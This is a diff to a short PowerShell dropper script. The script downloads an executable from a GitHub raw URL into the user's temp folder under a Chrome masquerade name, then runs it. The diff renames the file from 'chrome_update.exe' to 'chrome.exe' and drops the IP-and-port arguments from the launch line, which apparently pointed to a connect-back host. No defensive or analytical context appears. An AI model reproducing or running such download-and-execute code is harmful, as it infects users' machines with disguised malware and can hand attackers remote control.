@@ -1,5 +1,5 @@
 $dlUrl = "https://raw.githubusercontent.com/N8crawler2139/MyCode/main/179_61_197_44_55639.exe"
-$dlPath = Join-Path -Path $env:USERPROFILE -ChildPath "Appdata\local\temp\chrome_update.exe"
+$dlPath = Join-Path -Path $env:USERPROFILE -ChildPath "Appdata\local\temp\chrome.exe"
 Invoke-WebRequest -Uri $dlUrl -OutFile $dlPath
 cd $env:USERPROFILE
-.\Appdata\local\temp\chrome_update.exe 149.50.218.26 55639
+.\Appdata\local\temp\chrome.exe
